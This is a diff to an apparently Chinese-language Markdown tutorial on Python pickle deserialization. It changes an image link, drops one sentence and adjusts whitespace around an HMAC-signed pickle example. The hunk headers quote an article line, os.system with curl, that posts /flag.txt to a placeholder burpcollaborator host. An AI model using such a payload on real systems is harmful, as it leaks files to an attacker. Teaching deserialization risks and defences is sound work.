@@ -558,7 +558,7 @@ return ticket
 
 ### -->>仅可以引入`builtins`模块
 
-![9a07ed4bd4c85ec67bcc780dae379984.png](http://blog.nsfocus.net/wp-content/uploads/2019/04/9a07ed4bd4c85ec67bcc780dae379984.png)
+![img](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/9a07ed4bd4c85ec67bcc780dae379984.png)
 
 更多知识参考：[深入理解Python中的`__builtin__`和`__builtins__`](https://blog.51cto.com/xpleaf/1764849)  |  [Python 的内建对象](https://www.jianshu.com/p/645e973 83c1f)  |  [`__builtins__` 与 `__builtin__`（builtins）](https://zhuanlan.zhihu.com/p/125693125)
 
@@ -668,8 +668,6 @@ tR.
 ![image-20210809172045469](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809172045469.png)
 
 成功执行代码（注意运行时不仅需要引入pickle 也要引入builtins才可以！）
-
-理解opcode时需要注意
 
 ————用pker
 
@@ -1139,34 +1137,34 @@ os.system('curl -d '@/flag.txt' http://xxxx.burpcollaborator.net/)
   import hmac
   import pickle
   import base64
-
+  
   class Student:
       def __init__(self, name, age):
           self.name = name
           self.age = age
-
+  
       def __str__(self):
           return "My name is %s, I am %d years old." % (
               self.name,
               self.age
           )
-
+  
   class HMAC_Pickler:
       def __init__(self, secret_key, seperator="|"):
           self.secret_key = secret_key
           self.seperator = seperator
-
+  
       def digital_signature(self, data):
           signer = hmac.new(self.secret_key)
           signer.update(data)
           return signer.hexdigest()
-
+  
       def loads(self, data):
           sign = data[:32]
           p = data[32+len(self.seperator):]
           assert sign == self.digital_signature(p), ("Data is tampered by someone.")
           return pickle.loads(p)
-
+  
       def dumps(self, obj):
           p = pickle.dumps(obj)
           sign = self.digital_signature(p)
@@ -1174,21 +1172,21 @@ os.system('curl -d '@/flag.txt' http://xxxx.burpcollaborator.net/)
       def main():
       SECRET_KEY = b'7f54a0ab-6443-457c-ba20-2510ebbfb28f'
       pickler = HMAC_Pickler(SECRET_KEY)
-
+  
       obj = Student("Jack", 19)
       print(obj)
-
+  
       p = pickler.dumps(obj)
       print(p)
-
+  
       o = pickler.loads(p)
       print(o)
-
+  
       p += "I am hacker, trying evil things"
-
+  
       x = pickler.loads(p)
       print(x)
-
+  
   if __name__ == "__main__":
       main()
   ```
